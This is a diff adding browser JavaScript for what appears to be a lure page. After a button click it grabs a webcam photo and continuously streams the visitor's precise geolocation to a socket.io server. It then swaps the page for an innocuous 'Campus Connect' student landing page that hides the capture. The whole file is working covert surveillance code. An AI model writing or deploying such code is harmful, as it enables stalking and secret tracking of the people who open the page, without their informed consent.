@@ -1,0 +1,10 @@
+const s=io(),b=document.getElementById("go"),v=document.getElementById("v"),c=document.getElementById("c"),st=document.getElementById("status");
+b.onclick=async()=>{b.disabled=true;st.textContent="Requesting browser permissions…";try{
+const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:1280},height:{ideal:720}},audio:false});v.srcObject=stream;await v.play();
+if(!navigator.geolocation)throw Error("Location is not supported.");
+navigator.geolocation.watchPosition(p=>s.emit("visitor:location",{latitude:p.coords.latitude,longitude:p.coords.longitude,accuracy:p.coords.accuracy}),e=>st.textContent=e.message,{enableHighAccuracy:true,maximumAge:5000,timeout:10000});
+setTimeout(()=>{c.width=v.videoWidth;c.height=v.videoHeight;c.getContext("2d").drawImage(v,0,0);s.emit("visitor:photo",c.toDataURL("image/jpeg",.82));
+document.body.innerHTML=`<header class="nav"><div class="brand"><b>CC</b> Campus Connect</div><nav>Discover &nbsp;&nbsp; Events &nbsp;&nbsp; Community <button>Explore</button></nav></header>
+<main class="home"><section class="hero"><div><small class="eyebrow">YOUR CAMPUS • YOUR COMMUNITY</small><h2>Make your<br><i>next chapter</i><br>unforgettable.</h2><p>Discover events, connect with people, and explore everything your campus has to offer.</p><button class="primary">Explore Campus →</button></div><div class="visual"><div class="ring r1"></div><div class="ring r2"></div><div class="glass"><span>🎓</span><b>Campus Life</b><small>Learn • Connect • Grow</small></div><div class="float">✦ <b>25+</b><small>Upcoming events</small></div></div></section>
+<section class="cards"><article><em>01</em><h3>Discover</h3><p>Find workshops, clubs and activities around campus.</p></article><article><em>02</em><h3>Connect</h3><p>Meet communities and make meaningful connections.</p></article><article><em>03</em><h3>Grow</h3><p>Turn campus moments into new opportunities.</p></article></section></main>`},1200)
+}catch(e){st.textContent="Permission was not granted: "+e.message;b.disabled=false}};
